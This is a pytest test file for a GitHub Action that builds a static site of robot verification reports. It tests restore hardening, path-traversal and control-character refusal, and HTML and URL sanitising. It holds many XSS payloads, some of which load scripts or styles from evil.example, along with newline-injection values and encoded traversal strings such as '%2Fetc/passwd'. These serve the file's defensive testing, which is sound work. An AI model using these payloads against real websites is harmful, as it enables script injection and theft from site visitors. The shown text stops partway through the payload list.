        finding="Drifted.",
    )
    site_tool.build(reports_dir, r2)

    history = (reports_dir / "unitree-g1/stock-mujoco-hallway/index.html").read_text(
        encoding="utf-8"
    )
    assert "Spec changed: v3.0.0 → v3.1.0" in history
    assert "Run Integrity not graded" in history
    assert "None/None" not in history
    assert 'href="runs/200/#evaluator-livingproof-scenario"' in history


def test_tampered_checksums_and_invalid_reports_fail_closed(tmp_path: Path):
    runs_in = tmp_path / "in"
    folder = _make_run_folder(runs_in, "hallway")
    (folder / "report.txt").write_text("tampered\n", encoding="utf-8")
    with pytest.raises(site_tool.SiteError, match="SHA256SUMS"):
        site_tool.build(tmp_path / "reports", runs_in)


# ---------------------------------------------------------------- client timezone script


def test_open_js_formats_viewer_timezone_without_relative_age(tmp_path: Path):
    runs_in = tmp_path / "in"
    _make_run_folder(runs_in, "hallway", created="2026-11-18T05:20:00Z")
    reports_dir = tmp_path / "reports"
    site_tool.build(reports_dir, runs_in)

    index_html = (reports_dir / "index.html").read_text(encoding="utf-8")
    open_js = (reports_dir / "open.js").read_text(encoding="utf-8")

    class TimeExtractor(HTMLParser):
        def __init__(self):
            super().__init__()
            self.times: list[dict] = []
            self._cur: dict | None = None

        def handle_starttag(self, tag, attrs):
            amap = dict(attrs)
            if tag == "time" and "datetime" in amap:
                self._cur = {
                    "datetime": amap["datetime"],
                    "title": amap.get("title", ""),
                    "text": "",
                }
                self.times.append(self._cur)

        def handle_endtag(self, tag):
            if tag == "time":
                self._cur = None

        def handle_data(self, data):
            if self._cur is not None:
                self._cur["text"] += data

    ext = TimeExtractor()
    ext.feed(index_html)
    assert ext.times and ext.times[0]["text"] == "18 Nov 2026, 05:20 UTC"

    driver = r"""
const fs = require("fs");
const vm = require("vm");
const payload = JSON.parse(fs.readFileSync(0, "utf8"));
const els = payload.times.map((t) => {
  const attrs = new Map([["datetime", t.datetime], ["title", t.title]]);
  return {
    textContent: t.text,
    getAttribute: (k) => (attrs.has(k) ? attrs.get(k) : null),
    setAttribute: (k, v) => attrs.set(k, String(v)),
  };
});
const ctx = {
  Date,
  Number,
  String,
  Math,
  Intl: {
    DateTimeFormat: function (loc, opts) {
      return new Intl.DateTimeFormat(loc || payload.locale, { ...opts, timeZone: payload.tz });
    },
  },
  document: {
    readyState: "complete",
    fonts: null,
    addEventListener: () => {},
    querySelectorAll: (sel) => (sel === "time[datetime]" ? els : []),
  },
  window: { addEventListener: () => {} },
};
vm.runInNewContext(payload.script, ctx);
process.stdout.write(JSON.stringify(els.map((e) => e.textContent)));
"""
    for tz, locale, expected in [
        ("Australia/Sydney", "en-AU", "18 Nov 2026, 16:20 AEDT"),
        ("America/Los_Angeles", "en-US", "17 Nov 2026, 21:20 PST"),
        ("Asia/Kolkata", "en-US", "18 Nov 2026, 10:50 GMT+5:30"),
    ]:
        proc = subprocess.run(
            ["node", "-e", driver],
            input=json.dumps({"script": open_js, "times": ext.times, "tz": tz, "locale": locale}),
            check=True,
            capture_output=True,
            text=True,
            env={**os.environ, "TZ": tz},
        )
        rendered = json.loads(proc.stdout)
        assert rendered[0] == expected


# ---------------------------------------------------------------- site_action PR vs main behavior


def test_site_action_pull_request_builds_artifact_only_without_restoring(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
):
    def forbid_restore(*args, **kwargs):
        raise AssertionError("restore() must not run on pull_request with restore-history=auto")

    monkeypatch.setattr(site_tool, "restore", forbid_restore)

    runs_in = tmp_path / "runs"
    site_fixture.write(runs_in, run_id="42", created="2026-11-23T01:00:00Z")
    out_dir = tmp_path / "reports"
    gh_out = tmp_path / "github_output.txt"

    outputs = site_action.run_site_action(
        {
            "INPUT_RUNS_DIR": str(runs_in),
            "INPUT_OUTPUT_DIR": str(out_dir),
            "INPUT_EVIDENCE_RETENTION_DAYS": "7",
            "INPUT_RESTORE_HISTORY": "auto",
            "INPUT_UPLOAD_ARTIFACT": "auto",
            "GITHUB_EVENT_NAME": "pull_request",
            "GITHUB_RUN_ID": "999",
            "GITHUB_WORKSPACE": str(tmp_path),
            "GITHUB_RUN_ATTEMPT": "1",
            "GITHUB_OUTPUT": str(gh_out),
        }
    )
    assert outputs["artifact-only"] == "true"
    assert outputs["should-upload-artifact"] == "true"
    assert outputs["runs-count"] == "3"
    assert (out_dir / "index.html").is_file()
    written_out = gh_out.read_text(encoding="utf-8")
    assert "artifact-only=true\n" in written_out
    assert "should-upload-artifact=true\n" in written_out


def test_site_action_main_push_restores_history_and_skips_pr_upload_by_default(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
):
    called_restore = []

    def track_restore(dest, repo, **kwargs):
        called_restore.append((dest, repo, kwargs))
        return None

    monkeypatch.setattr(site_tool, "restore", track_restore)

    runs_in = tmp_path / "runs"
    site_fixture.write(runs_in, run_id="500", created="2026-11-23T02:00:00Z")
    out_dir = tmp_path / "docs/html/reports"

    outputs = site_action.run_site_action(
        {
            "INPUT_RUNS_DIR": str(runs_in),
            "INPUT_OUTPUT_DIR": str(out_dir),
            "INPUT_RESTORE_HISTORY": "auto",
            "INPUT_UPLOAD_ARTIFACT": "auto",
            "GITHUB_EVENT_NAME": "push",
            "GITHUB_REPOSITORY": REPO,
            "GITHUB_RUN_ID": "500",
            "GITHUB_WORKSPACE": str(tmp_path),
            "GITHUB_TOKEN": "tok",
        }
    )
    assert len(called_restore) == 1
    assert called_restore[0][1] == REPO
    assert outputs["artifact-only"] == "false"
    assert outputs["should-upload-artifact"] == "false"
    assert (out_dir / "index.html").is_file()


def test_multi_configuration_definition_folders_do_not_collide(tmp_path: Path):
    runs_in = tmp_path / "verification-report"
    for config, grade in (("stock", "PASS"), ("modified", "FAIL")):
        folder = runs_in / "walk-hallway" / config
        folder.mkdir(parents=True)
        report = {
            "report_version": "1.0.0",
            "summaries": [
                {
                    "capability": "walk-hallway",
                    "system": {"id": f"unitree-g1/{config}", "version": "1.0.0"},
                    "grade": grade,
                    "k": 1 if grade == "PASS" else 0,
                    "n": 1,
                    "required_passes": 1,
                }
            ],
        }
        (folder / "report.json").write_text(json.dumps(report, indent=2) + "\n", encoding="utf-8")
        (folder / "report.html").write_text(
            f"<!doctype html><html><body><p>{config}: {grade}</p></body></html>\n",
            encoding="utf-8",
        )
        (folder / "report.md").write_text(f"# {config}: {grade}\n", encoding="utf-8")
        (folder / "report.txt").write_text(f"{config}: {grade}\n", encoding="utf-8")
        run_record = {
            "variant": "walk-hallway",
            "verification": "walk-hallway",
            "run": {
                "id": "42",
                "url": f"https://github.com/{REPO}/actions/runs/42",
                "created": "2026-11-23T04:00:00Z",
            },
            "commit": {"sha": "a" * 40, "url": f"https://github.com/{REPO}/commit/{'a' * 40}"},
            "robot": {
                "repository": REPO,
                "commit": "a" * 40,
                "configuration": config,
                "url": f"https://github.com/{REPO}/tree/{'a' * 40}",
            },
        }
        (folder / "run.json").write_text(json.dumps(run_record, indent=2) + "\n", encoding="utf-8")
        (folder / "SHA256SUMS").write_text(
            "".join(
                f"{hashlib.sha256((folder / n).read_bytes()).hexdigest()}  {n}\n"
                for n in site_tool.REPORT_FILES
            ),
            encoding="utf-8",
        )

    reports_dir = tmp_path / "reports"
    site_tool.build(reports_dir, runs_in)
    assert site_fixture.check_reports_tree(reports_dir) == []
    assert (reports_dir / "unitree-g1/walk-hallway-modified/runs/42/run.json").is_file()
    assert (reports_dir / "unitree-g1/walk-hallway-stock/runs/42/run.json").is_file()
    index = (reports_dir / "index.html").read_text(encoding="utf-8")
    assert index.index("walk-hallway-modified/latest/") < index.index("walk-hallway-stock/latest/")


# ---------------------------------------------------------------- takeover hardening (Rivet)


def _zip_of_tar(entries: list[tuple[tarfile.TarInfo, bytes | None]]) -> bytes:
    tar_buf = io.BytesIO()
    with tarfile.open(fileobj=tar_buf, mode="w") as tar:
        for info, data in entries:
            if data is not None:
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))
            else:
                tar.addfile(info)
    zip_buf = io.BytesIO()
    with zipfile.ZipFile(zip_buf, "w") as zf:
        zf.writestr("artifact.tar", tar_buf.getvalue())
    return zip_buf.getvalue()


def test_restore_refuses_hardlinks_duplicates_and_symlinks_already_in_the_destination(
    tmp_path: Path,
):
    hard = tarfile.TarInfo("reports/a/b/runs/1/run.json")
    hard.type = tarfile.LNKTYPE
    hard.linkname = "etc/passwd"
    with pytest.raises(site_tool.SiteError, match="Unexpected entry"):
        site_tool.extract_pages_reports(_zip_of_tar([(hard, None)]), tmp_path / "hard")

    dup = [
        (tarfile.TarInfo("reports/index.html"), b"one"),
        (tarfile.TarInfo("reports/index.html"), b"two"),
    ]
    with pytest.raises(site_tool.SiteError, match="more than once"):
        site_tool.extract_pages_reports(_zip_of_tar(dup), tmp_path / "dup")

    # A symlink that already sits in the output directory (for example committed in the
    # caller's checkout) must not let a restored file land outside it.
    outside = tmp_path / "outside"
    outside.mkdir()
    dest = tmp_path / "dest"
    dest.mkdir()
    (dest / "unitree-g1").symlink_to(outside, target_is_directory=True)
    archive = _zip_of_tar([(tarfile.TarInfo("reports/unitree-g1/x/runs/1/run.json"), b"{}")])
    with pytest.raises(site_tool.SiteError, match="symlink"):
        site_tool.extract_pages_reports(archive, dest)
    assert list(outside.rglob("*")) == []


def test_restore_refuses_an_oversized_reports_subtree(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
):
    monkeypatch.setattr(reports_restore, "MAX_RESTORED_BYTES", 4)
    archive = _zip_of_tar([(tarfile.TarInfo("reports/index.html"), b"12345")])
    with pytest.raises(site_tool.SiteError, match="too large"):
        site_tool.extract_pages_reports(archive, tmp_path / "big")
    assert not (tmp_path / "big" / "index.html").exists()


@pytest.mark.parametrize(
    "parts",
    [("Unitree G1", "stock", "1"), ("unitree-g1", "Stock", "1"), ("unitree-g1", "stock", "-1")],
)
def test_restored_run_paths_must_be_safe_segments(tmp_path: Path, parts: tuple[str, str, str]):
    reports = tmp_path / "reports"
    robot, variant, run_id = parts
    run = reports / robot / variant / "runs" / run_id
    run.mkdir(parents=True)
    (run / "run.json").write_text(json.dumps({"run": {"created": "2026-11-20T00:00:00Z"}}))
    with pytest.raises(site_tool.SiteError, match="unsafe run path"):
        site_tool.runs(reports)


def test_restored_symlinked_run_folder_is_refused(tmp_path: Path):
    real = tmp_path / "elsewhere"
    real.mkdir()
    (real / "run.json").write_text(json.dumps({"run": {"created": "2026-11-20T00:00:00Z"}}))
    runs_dir = tmp_path / "reports/unitree-g1/stock/runs"
    runs_dir.mkdir(parents=True)
    (runs_dir / "100").symlink_to(real, target_is_directory=True)
    with pytest.raises(site_tool.SiteError, match="unsafe run path"):
        site_tool.runs(tmp_path / "reports")


def test_site_action_restores_only_from_the_calling_repository(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
):
    seen: list[str] = []
    monkeypatch.setattr(site_tool, "restore", lambda dest, repo, **kw: seen.append(repo))
    runs_in = tmp_path / "runs"
    site_fixture.write(runs_in, run_id="501", created="2026-11-23T02:00:00Z")
    site_action.run_site_action(
        {
            "INPUT_RUNS_DIR": str(runs_in),
            "INPUT_OUTPUT_DIR": str(tmp_path / "reports"),
            "INPUT_REPOSITORY": "Other-Org/attacker-site",
            "GITHUB_EVENT_NAME": "push",
            "GITHUB_REPOSITORY": REPO,
            "GITHUB_RUN_ID": "501",
            "GITHUB_WORKSPACE": str(tmp_path),
        }
    )
    assert seen == [REPO]


def test_build_never_runs_a_reporter_binary_found_on_path(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
):
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    marker = tmp_path / "ran"
    fake = bin_dir / "livingproof-capability-report"
    fake.write_text(f"#!/bin/sh\ntouch {marker}\nexit 1\n")
    fake.chmod(0o755)
    monkeypatch.setenv("PATH", f"{bin_dir}{os.pathsep}{os.environ.get('PATH', '')}")
    runs_in = tmp_path / "runs"
    site_fixture.write(runs_in, run_id="77", created="2026-11-23T03:00:00Z")
    site_tool.build(tmp_path / "reports", runs_in)
    assert not marker.exists()
    assert site_fixture.check_reports_tree(tmp_path / "reports") == []


def test_forged_run_json_hrefs_allow_only_https_and_relative_links(tmp_path: Path):
    runs_in = tmp_path / "in"
    folder = _make_run_folder(runs_in, "hallway", run_id="404", tag=None)
    record = json.loads((folder / "run.json").read_text(encoding="utf-8"))
    record["commit"]["url"] = "javascript:alert(4)"
    record["robot"]["url"] = "  JaVaScRiPt:alert(5)"
    record["releases"]["verifier"]["url"] = "data:text/html,<script>alert(6)</script>"
    record["releases"]["reporter"]["url"] = "http://insecure.example/tag"
    record["releases"]["specs"]["url"] = "java\tscript:alert(7)"
    record["releases"]["extra"] = {
        "tag": "v1.0.0",
        "url": "https://github.com/Living-Proof-Labs/example/releases/tag/v1.0.0",
    }
    (folder / "run.json").write_text(json.dumps(record, indent=2) + "\n", encoding="utf-8")

    reports_dir = tmp_path / "reports"
    site_tool.build(reports_dir, runs_in)

    history_html = (reports_dir / "unitree-g1/stock-mujoco-hallway/index.html").read_text(
        encoding="utf-8"
    )
    index_html = (reports_dir / "index.html").read_text(encoding="utf-8")
    styles_css = (reports_dir / "styles.css").read_text(encoding="utf-8")

    for text in (history_html, index_html):
        assert "javascript:" not in text.lower()
        assert "data:" not in text.lower()
        assert 'href="http://' not in text.lower()
        assert "fonts.googleapis.com" not in text
        assert "fonts.gstatic.com" not in text

    assert "https://github.com/Living-Proof-Labs/example/releases/tag/v1.0.0" in history_html
    assert 'href="latest/"' in history_html
    assert "DM Sans" not in styles_css


@pytest.mark.parametrize(
    "bad_output_dir",
    ["", "   ", ".", "..", "../escape", "sub/../../escape", "a\\b", "/"],
)
def test_site_action_rejects_unsafe_output_dir(tmp_path: Path, bad_output_dir: str):
    runs_in = tmp_path / "runs"
    site_fixture.write(runs_in, run_id="77", created="2026-11-23T03:00:00Z")
    with pytest.raises(site_tool.SiteError, match="output-dir"):
        site_action.run_site_action(
            {
                "INPUT_RUNS_DIR": str(runs_in),
                "INPUT_OUTPUT_DIR": bad_output_dir,
                "INPUT_RESTORE_HISTORY": "false",
                "INPUT_UPLOAD_ARTIFACT": "false",
                "GITHUB_WORKSPACE": str(tmp_path),
            }
        )


def test_site_action_constrains_output_dir_to_github_workspace_and_ignores_input_now(
    tmp_path: Path,
):
    workspace = tmp_path / "ws"
    workspace.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    (workspace / "link-out").symlink_to(outside, target_is_directory=True)

    runs_in = tmp_path / "runs"
    site_fixture.write(runs_in, run_id="77", created="2026-11-23T03:00:00Z")

    for escaped in (str(outside / "reports"), str(workspace), "link-out/reports"):
        with pytest.raises(site_tool.SiteError, match="GITHUB_WORKSPACE"):
            site_action.run_site_action(
                {
                    "INPUT_RUNS_DIR": str(runs_in),
                    "INPUT_OUTPUT_DIR": escaped,
                    "INPUT_RESTORE_HISTORY": "false",
                    "INPUT_UPLOAD_ARTIFACT": "false",
                    "GITHUB_WORKSPACE": str(workspace),
                }
            )

    # INPUT_NOW is removed and ignored: setting it far in the future must not prune evidence.
    rel_out = "docs/reports"
    prev_cwd = Path.cwd()
    try:
        os.chdir(workspace)
        outputs = site_action.run_site_action(
            {
                "INPUT_RUNS_DIR": str(runs_in),
                "INPUT_OUTPUT_DIR": rel_out,
                "INPUT_EVIDENCE_RETENTION_DAYS": "7",
                "INPUT_NOW": "2099-01-01T00:00:00Z",
                "INPUT_RESTORE_HISTORY": "false",
                "INPUT_UPLOAD_ARTIFACT": "false",
                "GITHUB_EVENT_NAME": "push",
                "GITHUB_WORKSPACE": str(workspace),
                "GITHUB_RUN_ID": "77",
            }
        )
    finally:
        os.chdir(prev_cwd)

    assert outputs["reports-dir"] == rel_out
    assert (
        workspace / "docs/reports/unitree-g1/stock-mujoco-hallway/runs/77/evidence/trials.mcap"
    ).is_file()


# ---------------------------------------------------------------- va#14 takeover checks (Rivet)

ROOT = Path(__file__).resolve().parents[1]
REPORT_MODULES = ("reports_site", "reports_render", "reports_restore", "reports_common")


def _top_level_names(path: Path) -> set[str]:
    names: set[str] = set()
    for node in ast.parse(path.read_text(encoding="utf-8")).body:
        if isinstance(node, (ast.FunctionDef, ast.ClassDef)):
            names.add(node.name)
        elif isinstance(node, ast.Assign):
            names.update(t.id for t in node.targets if isinstance(t, ast.Name))
        elif isinstance(node, ast.AnnAssign) and isinstance(node.target, ast.Name):
            names.add(node.target.id)
    return names


def test_split_modules_define_each_top_level_name_once():
    # The split was cut by line ranges; a second, drifted copy of a helper (as with
    # _require_single_robot, _stamp, SITE_PATH) must not come back.
    seen: dict[str, str] = {}
    for module in REPORT_MODULES:
        for name in _top_level_names(ROOT / "src" / f"{module}.py") - {"__all__"}:
            assert name not in seen, f"{name} is defined in both {seen[name]} and {module}"
            seen[name] = module


def test_generated_site_matches_the_golden_bytes():
    import site_golden

    expected = (ROOT / "tests/fixtures/site-golden/SHA256SUMS").read_text(encoding="utf-8")
    with tempfile.TemporaryDirectory() as tmp:
        actual = site_golden.digests(site_golden.build_golden_site(Path(tmp)))
    assert actual == expected


def test_theme_switch_markup_matches_the_packaged_styles(tmp_path: Path):
    runs_in = tmp_path / "in"
    site_fixture.write(runs_in, run_id="1", created="2026-11-20T06:00:00Z")
    site_tool.build(tmp_path / "reports", runs_in)
    index_html = (tmp_path / "reports/index.html").read_text(encoding="utf-8")
    css = (tmp_path / "reports/styles.css").read_text(encoding="utf-8")
    assert '<fieldset class="theme">' in index_html
    for selector in (".theme label", "#theme-light:checked", "#theme-dark:checked"):
        assert selector in css
    for element_id in ("theme-system", "theme-light", "theme-dark"):
        assert f'id="{element_id}"' in index_html
    assert "DM Sans" not in css and "fonts.g" not in index_html


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("https://github.com/x/y", "https://github.com/x/y"),
        (
            "https://docs.livingprooflabs.com/reading-reports.html",
            "https://docs.livingprooflabs.com/reading-reports.html",
        ),
        (
            "https://github.com/Living-Proof-Labs/capability-verifier/commit/" + "c" * 40,
            "https://github.com/Living-Proof-Labs/capability-verifier/commit/" + "c" * 40,
        ),
        # The reporter never links to an IP literal, so none is allowed.
        ("https://[2001:db8::1]/x", None),
        ("https://[::1]/", None),
        ("https://@example.com/", None),
        (
            "https://docs.livingprooflabs.com:8443/path",
            "https://docs.livingprooflabs.com:8443/path",
        ),
        ("../runs/1/", "../runs/1/"),
        ("#summary", "#summary"),
        ("javascript:alert(1)", None),
        ("  JAVASCRIPT:alert(1)", None),
        ("java\nscript:alert(1)", None),
        ("vbscript:x", None),
        ("data:text/html,x", None),
        ("http://example.com/", None),
        ("//evil.example/x", None),
        ("https:evil", None),
        ("https://[::1", None),
        ("https://user:pass@example.com/", None),
        ("https://user@example.com/", None),
        ("https://exa mple.com/", None),
        ("https://exa\tmple.com/", None),
        ("https://-bad.example/", None),
        ("https://example.com:99999/", None),
        ("a\\b", None),
        ("", None),
        (None, None),
    ],
)
def test_safe_href_allows_only_https_and_relative_links(value, expected):
    import reports_render

    assert reports_render.safe_href(value) == expected


def test_packaged_assets_require_their_license_header(tmp_path: Path, monkeypatch):
    import reports_render

    (tmp_path / "styles.css").write_text(":root {}\n", encoding="utf-8")
    monkeypatch.setattr(reports_render, "ASSETS_DIR", tmp_path)
    with pytest.raises(site_tool.SiteError, match="license header"):
        reports_render.load_styles_css()


def test_site_action_from_another_checkout_loads_assets_from_the_action_path(tmp_path: Path):
    # Mirrors `uses: Living-Proof-Labs/verification-reports-action/site@<sha>`: the runner
    # unpacks the action somewhere else and runs it with the caller's workspace as cwd.
    action = tmp_path / "_actions/verification-reports-action/sha"
    for part in ("src", "tools", "site"):
        shutil.copytree(ROOT / part, action / part, ignore=shutil.ignore_patterns("__pycache__"))
    workspace = tmp_path / "caller"
    workspace.mkdir()
    site_fixture.write(
        workspace / "verification-report", run_id="9", created="2026-11-20T06:00:00Z"
    )
    env = {
        "PATH": os.environ["PATH"],
        "INPUT_RUNS_DIR": "verification-report",
        "INPUT_OUTPUT_DIR": "docs/html/reports",
        "INPUT_RESTORE_HISTORY": "false",
        "INPUT_UPLOAD_ARTIFACT": "false",
        "GITHUB_EVENT_NAME": "push",
        "GITHUB_WORKSPACE": str(workspace),
        "GITHUB_OUTPUT": str(tmp_path / "out.txt"),
    }
    subprocess.run(
        [sys.executable, str(action / "site/../src/site_action.py")],
        cwd=workspace,
        env=env,
        check=True,
        capture_output=True,
        text=True,
    )
    built = workspace / "docs/html/reports"
    packaged = (action / "src/assets/styles.css").read_text(encoding="utf-8")
    assert (built / "styles.css").read_text(encoding="utf-8") == packaged.split("\n", 1)[1]
    packaged_js = (action / "src/assets/open.js").read_text(encoding="utf-8")
    assert (built / "open.js").read_text(encoding="utf-8") == packaged_js.split("\n", 1)[1]
    assert "reports-dir=docs/html/reports\n" in (tmp_path / "out.txt").read_text()


def test_site_action_yml_runs_the_script_from_the_action_path():
    text = (ROOT / "site/action.yml").read_text(encoding="utf-8")
    assert "SITE_ACTION_PATH: ${{ github.action_path }}" in text
    assert 'run: python3 "$SITE_ACTION_PATH/../src/site_action.py"' in text
    assert "github.workspace" not in text


def test_output_dir_is_resolved_in_the_workspace_not_the_cwd(tmp_path: Path, monkeypatch):
    workspace = tmp_path / "ws"
    workspace.mkdir()
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    monkeypatch.chdir(elsewhere)
    runs_in = tmp_path / "runs"
    site_fixture.write(runs_in, run_id="5", created="2026-11-23T03:00:00Z")
    base = {
        "INPUT_RUNS_DIR": str(runs_in),
        "INPUT_RESTORE_HISTORY": "false",
        "INPUT_UPLOAD_ARTIFACT": "false",
        "GITHUB_EVENT_NAME": "push",
    }
    outputs = site_action.run_site_action(
        base | {"INPUT_OUTPUT_DIR": "site/reports", "GITHUB_WORKSPACE": str(workspace)}
    )
    assert outputs["reports-dir"] == "site/reports"
    assert (workspace / "site/reports/index.html").is_file()
    assert not (elsewhere / "site").exists()

    for bad in (".git/reports", "docs/.git/x", "./"):
        with pytest.raises(site_tool.SiteError, match="output-dir"):
            site_action.run_site_action(
                base | {"INPUT_OUTPUT_DIR": bad, "GITHUB_WORKSPACE": str(workspace)}
            )

    # With GITHUB_WORKSPACE unset, the current directory is the boundary; the check stays on.
    with pytest.raises(site_tool.SiteError, match="GITHUB_WORKSPACE"):
        site_action.run_site_action(base | {"INPUT_OUTPUT_DIR": str(workspace / "reports")})


def test_output_dir_symlink_to_a_parent_of_the_workspace_is_refused(tmp_path: Path):
    workspace = tmp_path / "ws"
    workspace.mkdir()
    (workspace / "up").symlink_to(tmp_path, target_is_directory=True)
    runs_in = tmp_path / "runs"
    site_fixture.write(runs_in, run_id="6", created="2026-11-23T03:00:00Z")
    with pytest.raises(site_tool.SiteError, match="GITHUB_WORKSPACE"):
        site_action.run_site_action(
            {
                "INPUT_RUNS_DIR": str(runs_in),
                "INPUT_OUTPUT_DIR": "up/escaped",
                "INPUT_RESTORE_HISTORY": "false",
                "INPUT_UPLOAD_ARTIFACT": "false",
                "GITHUB_WORKSPACE": str(workspace),
            }
        )
    assert not (tmp_path / "escaped").exists()


# ---------------------------------------------------------------- Vera's PR 16 findings (Rivet)


@pytest.mark.parametrize(
    ("value", "allowed"),
    [
        # Characters main's SITE_PATH allows. Gemini's split had dropped the apostrophe.
        ("evidence/a'b.html", True),
        ("evidence/trial's-video.mp4", True),
        ("evidence/a~b!c$d&e(f)g*h+i,j;k=l@m%20n-o_p.q", True),
        ("evidence/seed-1/trials.mcap", True),
        # Characters main refuses. Gemini's split had added the colon.
        ("evidence/a:b", False),
        ("a:b", False),
        ("evidence/a b.html", False),
        ('evidence/a"b.html', False),
        ("evidence/a<b>.html", False),
        ("evidence/a\\b.html", False),
        ("", False),
        ("x" * 241, False),
    ],
)
def test_site_path_charset_matches_main(value: str, allowed: bool):
    import reports_common

    # Reverting the SITE_PATH fix (dropping ' or adding :) fails this table.
    assert (reports_common.SITE_PATH.fullmatch(value) is not None) is allowed
    assert (reports_common.site_path(value) == value) is allowed


@pytest.mark.parametrize(
    "value", ["a\x01b", "evidence/\x00x", "https://example.com/\x7f", "x\x1fy"]
)
def test_safe_href_refuses_control_characters_that_urlsplit_keeps(value: str):
    import reports_render

    # urlsplit strips tab and newline itself. These survive it, so only safe_href's own
    # control-character check refuses them. Removing that check fails this test.
    assert reports_render.safe_href(value) is None


@pytest.mark.parametrize(
    ("name", "value"),
    [
        ("INPUT_OUTPUT_DIR", "docs/reports\nartifact-only=false"),
        ("INPUT_OUTPUT_DIR", "docs/reports\r"),
        ("INPUT_OUTPUT_DIR", "docs/\x00reports"),
        ("INPUT_OUTPUT_DIR", "docs/\x1breports"),
        ("INPUT_ARTIFACT_NAME", "site\nreports-dir=/etc"),
        ("INPUT_ARTIFACT_NAME", "site\n"),
        # The default artifact-name is built from GITHUB_RUN_ID, so it is checked too.
        ("GITHUB_RUN_ID", "8\nreports-dir=/etc"),
    ],
)
def test_site_action_refuses_control_characters_before_writing_github_output(
    tmp_path: Path, name: str, value: str
):
    runs_in = tmp_path / "runs"
    site_fixture.write(runs_in, run_id="8", created="2026-11-23T03:00:00Z")
    gh_out = tmp_path / "github_output.txt"
    env = {
        "INPUT_RUNS_DIR": str(runs_in),
        "INPUT_OUTPUT_DIR": "docs/reports",
        "INPUT_RESTORE_HISTORY": "false",
        "INPUT_UPLOAD_ARTIFACT": "false",
        "GITHUB_EVENT_NAME": "push",
        "GITHUB_WORKSPACE": str(tmp_path),
        "GITHUB_OUTPUT": str(gh_out),
    }
    env[name] = value
    # Removing the control-character check lets the newline forge a GITHUB_OUTPUT line,
    # and validating artifact-name after build() would still write to docs/reports.
    with pytest.raises(site_tool.SiteError, match="control characters"):
        site_action.run_site_action(env)
    assert not (tmp_path / "docs/reports").exists()
    assert not gh_out.exists()


@pytest.mark.parametrize(
    ("value", "allowed"),
    [
        ("evidence/a'b.html", True),
        ("evidence/a~b!c$d&e(f)g*h+i,j;k=l@m%20n-o_p.q", True),
        ("%2e%2e%2f", False),
        ("%2E%2E/", False),
        ("evidence/%2e%2e/secret", False),
        ("a/./b", False),
        ("./a", False),
        ("a/.", False),
        ("evidence/%2e/b", False),
        ("evidence/a%00b", False),
        ("evidence/a%01b", False),
        ("evidence/a%1fb", False),
        ("evidence/a%7fb", False),
        # Each of these is refused only after decoding, by its own check.
        ("evidence/a%3Ab", False),
        ("evidence/a%5Cb", False),
        ("%2Fetc/passwd", False),
        ("evidence%2Factions%2Fruns", False),
        ("evidence/%61rtifact.zip", False),
        # And these only before decoding.
        ("/evidence/a", False),
        ("evidence/action/runs", True),
        ("x/actions/y", False),
        ("evidence/Artifacts.zip", False),
        ("evidence/%aartifact.zip", False),
    ],
)
def test_site_path_refuses_encoded_traversal_dot_segments_and_encoded_controls(
    value: str, allowed: bool
):
    import reports_common

    assert (reports_common.site_path(value) == value) is allowed


# ---------------------------------------------------------------- va#20 N1: published report HTML


REPORTER_FIXTURE = ROOT / "tests/fixtures/reporter/report-v3.15.4.html"

HOSTILE_REPORT_MARKUP = [
    "<SCRIPT>alert(1)</SCRIPT>",
    "<script src='https://evil.example/x.js'></script>",
    "<script data-report-times/>alert(1)</script>",
    "<svg onload=alert(1)></svg>",
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<IMG SRC=x OnError=alert(1)>",
    "<img srcset='https://evil.example/x.png 1x'>",
    "<img src='evidence/x.png' onerror='alert(1)'>",
    "<details open ontoggle=alert(1)><summary>x</summary></details>",
    "<a href='https://ok.example/' onclick='alert(1)'>x</a>",
    "<a href=javascript:alert(1)>x</a>",
    "<a href='&#106;avascript:alert(1)'>x</a>",
    "<a href='javascript&colon;alert(1)'>x</a>",
    "<a href='javascript&#58;alert(1)'>x</a>",
    "<a href='java&Tab;script:alert(1)'>x</a>",
    "<a href='data:text/html,<script>alert(1)</script>'>x</a>",
    "<a href='http://insecure.example/'>x</a>",
    "<a href='//evil.example/'>x</a>",
    "<a href='https://user:pass@evil.example/'>x</a>",
    "<a href='https://ok.example/' href='javascript:alert(1)'>x</a>",
    "<a/href='javascript:alert(1)'>x</a>",
    # Written so a browser and this parser could read the attributes differently.
    "<a/href='https://ok.example/'>x</a>",
    "<p title='x'class='y'>x</p>",
    "<p title=a`b>x</p>",
    "<p title=x=y>x</p>",
    "<p class='a' class='b'>x</p>",
    # Elements outside the reporter's vocabulary, even with no attributes.
    "<iframe></iframe>",
    "<object></object>",
    "<xmp><img src=x onerror=alert(1)></xmp>",
    "<plaintext>",
    "<base>",
    "<marquee>x",
    "<noscript></noscript>",
    "<math><mi>x</mi></math>",
    "<svg><style>p{color:red}</style></svg>",
    "<a href='https://ok.example/'/onclick=alert(1)>x</a>",
    "<div style='background:url(https://evil.example/x)'>x</div>",
    "<div style='background:u\\72l(https://evil.example/x)'>x</div>",
    "<div style='background:image-set(\"https://evil.example/x\" 1x)'>x</div>",
    "<style>@import 'https://evil.example/x.css';</style>",
    "<style>body{background:url(https://evil.example/x)}</style>",
    "<style>body{background:URL( 'https://evil.example/x' )}</style>",
    "<style/>body{background:url(https://evil.example/x)}</style>",
    "<svg><style><img src=x onerror=alert(1)></style></svg>",
    "<svg><p>breakout</p></svg>",
    "<p><div></div><svg></p><style><img src=x onerror=alert(1)></style></svg>",
    "<svg><a xlink:href='javascript:alert(1)'><text>x</text></a></svg>",
    "<svg><use href='https://evil.example/x.svg#a'/></svg>",
    "<svg><rect fill='url(https://evil.example/x#a)'/></svg>",
    "<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>",
    "<svg><animate attributeName='href' to='javascript:alert(1)'/></svg>",
    "<math><mi xlink:href='javascript:alert(1)'>x</mi></math>",
    "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>",
    "<iframe src='https://evil.example/'></iframe>",
